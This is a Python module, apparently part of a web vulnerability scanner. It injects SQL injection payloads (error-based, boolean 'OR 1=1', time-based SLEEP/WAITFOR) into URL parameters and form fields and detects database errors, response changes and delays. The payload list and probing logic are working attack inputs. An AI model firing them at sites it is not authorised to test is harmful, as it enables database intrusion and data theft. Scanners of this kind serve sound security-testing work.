"""
SQL Injection Scanner - FIXED:
  - Tests base_url itself
  - Broader error signatures
  - Boolean-based detection (compares response length/content)
  - Better time-based threshold
"""

import logging
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

logger = logging.getLogger(__name__)

SQLI_PAYLOADS = [
    # Error-based
    ("'",                          'error_based'),
    ('"',                          'error_based'),
    ("'--",                        'error_based'),
    ("' OR '1'='1'--",             'boolean_based'),
    ("' OR 1=1--",                 'boolean_based'),
    ('" OR 1=1--',                 'boolean_based'),
    ("' OR 1=1#",                  'boolean_based'),
    ("') OR ('1'='1",              'boolean_based'),
    ("1' AND SLEEP(3)--",          'time_based'),
    ("1; WAITFOR DELAY '0:0:3'--", 'time_based'),
    ("1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--", 'time_based'),
]

ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "pg::syntaxerror",
    "sqlite3",
    "sqlite exception",
    "ora-01756",
    "microsoft ole db provider for sql server",
    "odbc sql server driver",
    "syntax error",
    "sql command not properly ended",
    "mysql_fetch",
    "supplied argument is not a valid mysql",
    "invalid query",
    "mysql error",
    "division by zero",
    "operationalerror",
    "psycopg2",
    "unterminated string",
    "unexpected end of sql",
]


class SQLiScanner:
    def __init__(self, http_client):
        self.http = http_client

    def scan(self, base_url, urls, forms, endpoints, **_) -> list:
        findings = []
        all_targets = list(dict.fromkeys([base_url] + urls + endpoints))

        for url in all_targets:
            findings.extend(self._test_url_params(url))

        for form in forms:
            findings.extend(self._test_form(form))

        # Deduplicate
        seen = set()
        unique = []
        for f in findings:
            key = (f['url'], f.get('parameter', ''), f['subtype'])
            if key not in seen:
                seen.add(key)
                unique.append(f)
        return unique

    def _test_url_params(self, url: str) -> list:
        findings = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if not params:
            return []

        # Baseline
        try:
            baseline_resp = self.http.get(url)
            baseline_len = len(baseline_resp.text) if baseline_resp else 0
        except Exception:
            baseline_len = 0

        for param_name in params:
            for payload, technique in SQLI_PAYLOADS:
                test_params = {k: v[0] for k, v in params.items()}
                original_val = test_params[param_name]
                test_params[param_name] = original_val + payload
                test_url = urlunparse(parsed._replace(query=urlencode(test_params)))

                try:
                    t0 = time.time()
                    resp = self.http.get(test_url)
                    elapsed = time.time() - t0

                    if resp is None:
                        continue

                    if technique == 'error_based' and self._has_sql_error(resp.text):
                        findings.append(self._make_finding(
                            url=url, param=param_name, payload=payload,
                            technique='error_based',
                            evidence=self._extract_error(resp.text), method='GET',
                        ))
                        break

                    elif technique == 'boolean_based' and baseline_len > 0:
                        # Significant difference in response = likely boolean SQLi
                        diff = abs(len(resp.text) - baseline_len)
                        ratio = diff / baseline_len if baseline_len else 0
                        if ratio > 0.3 and len(resp.text) > 100:
                            findings.append(self._make_finding(
                                url=url, param=param_name, payload=payload,
                                technique='boolean_based',
                                evidence=f"Respuesta cambió {diff} bytes ({ratio:.0%}) con payload booleano",
                                method='GET',
                            ))
                            break

                    elif technique == 'time_based' and elapsed > 2.5:
                        findings.append(self._make_finding(
                            url=url, param=param_name, payload=payload,
                            technique='time_based',
                            evidence=f"Respuesta retrasada {elapsed:.2f}s (umbral: 2.5s)",
                            method='GET',
                        ))
                        break

                except Exception as e:
                    logger.debug(f"SQLi URL test error: {e}")

        return findings

    def _test_form(self, form: dict) -> list:
        findings = []
        for field in form['fields']:
            if field['type'] in ('password', 'file', 'checkbox', 'radio'):
                continue
            for payload, technique in SQLI_PAYLOADS:
                data = {f['name']: f.get('value', '1') or '1' for f in form['fields']}
                original_val = data[field['name']]
                data[field['name']] = original_val + payload

                try:
                    t0 = time.time()
                    if form['method'] == 'POST':
                        resp = self.http.post(form['action'], data=data)
                    else:
                        resp = self.http.get(form['action'], params=data)
                    elapsed = time.time() - t0

                    if resp is None:
                        continue

                    if technique == 'error_based' and self._has_sql_error(resp.text):
                        findings.append(self._make_finding(
                            url=form['action'], param=field['name'],
                            payload=payload, technique='error_based',
                            evidence=self._extract_error(resp.text),
                            method=form['method'],
                        ))
                        break

                    elif technique == 'time_based' and elapsed > 2.5:
                        findings.append(self._make_finding(
                            url=form['action'], param=field['name'],
                            payload=payload, technique='time_based',
                            evidence=f"Respuesta retrasada {elapsed:.2f}s",
                            method=form['method'],
                        ))
                        break

                except Exception as e:
                    logger.debug(f"SQLi form test error: {e}")

        return findings

    @staticmethod
    def _has_sql_error(body: str) -> bool:
        if not body:
            return False
        body_l = body.lower()
        return any(sig in body_l for sig in ERROR_SIGNATURES)

    @staticmethod
    def _extract_error(body: str) -> str:
        body_l = body.lower()
        for sig in ERROR_SIGNATURES:
            idx = body_l.find(sig)
            if idx != -1:
                start = max(0, idx - 20)
                end = min(len(body), idx + 150)
                return '...' + body[start:end].replace('\n', ' ').strip() + '...'
        return 'Error SQL detectado en la respuesta'

    @staticmethod
    def _make_finding(url, param, payload, technique, evidence, method) -> dict:
        return {
            'type': 'sqli',
            'subtype': technique,
            'url': url,
            'parameter': param,
            'payload': payload,
            'evidence': evidence,
            'request': {'method': method, 'url': url},
        }
